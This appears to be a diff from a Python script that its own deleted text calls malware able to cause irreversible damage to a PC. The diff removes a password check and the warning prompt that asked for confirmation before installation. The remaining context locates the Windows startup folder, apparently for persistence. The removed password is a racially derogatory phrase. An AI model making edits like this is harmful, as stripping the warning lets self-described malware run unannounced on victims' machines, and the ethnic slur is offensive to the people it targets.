@@ -6,20 +6,6 @@ import requests
 import string
 import psutil
 import random
-  
-# Warning message
-Password=input("Please enter the password: ")
-if Password=='OilyChineseBoy1945':
-  print("Access granted.")
-else:
-  print("Access denied.")
-  quit()
-Warning=input("Warning, you are about to run malware that may cause irreversible damage to your pc once it is run. The creator will not be held liable for any damages to your PC. Proceed? (Y/N) ")
-if Warning=='Y':
- print("Beginning installation...")
-elif Warning=='N':
- print("Quitting...")
- quit()
 
 # Locate startup directory
 startup_directory = winshell.startup()
